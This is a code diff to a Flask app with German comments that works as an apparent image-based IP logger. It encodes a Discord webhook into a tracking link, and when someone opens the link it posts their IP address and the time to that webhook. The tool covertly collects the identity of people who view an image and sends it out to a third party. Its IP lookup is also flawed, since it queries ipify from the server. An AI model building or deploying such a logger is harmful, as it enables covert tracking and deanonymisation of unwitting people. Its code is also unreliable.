@@ -4,7 +4,6 @@ import json
 import secrets
 from datetime import datetime
 import urllib.request
-import urllib.parse
 import base64
 
 app = Flask(__name__)
@@ -29,20 +28,21 @@ def upload_image():
         # Generiere Tracking-ID
         tracking_id = secrets.token_urlsafe(8)
         
-        # Speichere Daten in globaler Variable für Vercel
-        if not hasattr(app, 'tracking_data'):
-            app.tracking_data = {}
-        
-        app.tracking_data[tracking_id] = {
+        # Erstelle Tracking-Daten
+        tracking_data = {
+            'id': tracking_id,
             'image_url': image_url,
             'webhook_url': webhook_url,
-            'tracking_id': tracking_id
+            'created_at': datetime.now().isoformat()
         }
         
-        # Generiere Tracking-URL ohne Base64
+        # Kodiere als Base64 (für kompatibilität)
+        tracking_data_encoded = base64.b64encode(json.dumps(tracking_data).encode()).decode()
+        
+        # Generiere Tracking-URL
         protocol = 'https://'
         host = request.host
-        tracking_url = f"{protocol}{host}/track?id={tracking_id}"
+        tracking_url = f"{protocol}{host}/track?data={tracking_data_encoded}"
         
         return jsonify({
             'success': True,
@@ -55,31 +55,28 @@ def upload_image():
 
 @app.route('/track')
 def track_image():
-    tracking_id = request.args.get('id')
+    # Hole Base64-Daten
+    tracking_data_encoded = request.args.get('data')
     
-    if not tracking_id:
-        return "Tracking-ID fehlt", 400
+    if not tracking_data_encoded:
+        return "Tracking-Daten fehlen", 400
     
     try:
-        # Hole Daten aus globaler Variable
-        if not hasattr(app, 'tracking_data') or tracking_id not in app.tracking_data:
-            return "Tracking-Daten nicht gefunden", 404
-            
-        tracking_data = app.tracking_data[tracking_id]
+        # Dekodiere die Base64-Daten
+        tracking_data = json.loads(base64.b64decode(tracking_data_encoded).decode())
         
         # Hole IP-Adresse
         ip_address = "Unbekannt"
         try:
-            # Einfachster IP-Service
             response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5)
             data = json.loads(response.read().decode())
             ip_address = data.get('ip', 'Unbekannt')
         except:
             ip_address = request.remote_addr or "Unbekannt"
         
-        # Sende Discord-Benachrichtigung SYNCHRON
+        # Sende Discord-Benachrichtigung
         try:
-            send_discord_now(tracking_data['webhook_url'], ip_address, tracking_id)
+            send_discord_message(tracking_data['webhook_url'], ip_address, tracking_data['id'])
         except Exception as e:
             print(f"Discord Fehler: {e}")
         
@@ -123,25 +120,30 @@ def track_image():
     except Exception as e:
         return f"Fehler: {str(e)}", 500
 
-def send_discord_now(webhook_url, ip_address, tracking_id):
-    """Sendet Discord-Nachricht sofort"""
-    # Einfachste mögliche Nachricht
-    message = f"🔍 Bild angesehen!\nIP: {ip_address}\nZeit: {datetime.now().strftime('%H:%M:%S')}\nID: {tracking_id}"
-    
-    # Einfachster möglicher Request
-    data = {"content": message}
-    
-    req = urllib.request.Request(
-        webhook_url,
-        data=json.dumps(data).encode('utf-8'),
-        headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-    )
-    
-    # Sende synchron
-    with urllib.request.urlopen(req, timeout=10) as response:
-        result = response.read().decode()
-        print(f"Discord Response: {result}")
-        return result
+def send_discord_message(webhook_url, ip_address, tracking_id):
+    """Sendet Discord-Nachricht"""
+    try:
+        # Einfache Nachricht
+        message = f"🔍 **Bild wurde angesehen!**\n\n**IP-Adresse:** `{ip_address}`\n**Uhrzeit:** `{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}`\n**Tracking-ID:** `{tracking_id}`"
+        
+        data = {
+            "content": message
+        }
+        
+        req = urllib.request.Request(
+            webhook_url,
+            data=json.dumps(data).encode('utf-8'),
+            headers={'Content-Type': 'application/json'}
+        )
+        
+        with urllib.request.urlopen(req, timeout=10) as response:
+            result = response.read().decode()
+            print(f"Discord Response: {result}")
+            return result
+            
+    except Exception as e:
+        print(f"Fehler beim Senden an Discord: {e}")
+        raise
 
 @app.route('/health')
 def health_check():
